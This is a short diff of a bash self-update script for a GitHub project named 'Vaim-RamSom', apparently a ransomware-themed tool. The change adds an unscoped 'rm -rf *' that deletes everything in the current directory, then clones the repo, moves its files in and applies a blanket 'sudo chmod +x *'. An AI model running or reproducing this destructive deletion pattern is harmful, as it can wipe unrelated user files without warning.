@@ -11,10 +11,10 @@ echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   Vaim-RamSom Updating...   !      \e[0m'
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
 echo ""
-cd
-sudo rm -rf Vaim-RamSom
+rm -rf *
 sudo git clone https://github.com/VaimpierOfficial/Vaim-RamSom
-cd Vaim-RamSom
+mv Vaim-RamSom/* $(pwd)
+rm -r Vaim-RamSom
 sudo chmod +x *
 clear
 echo ""
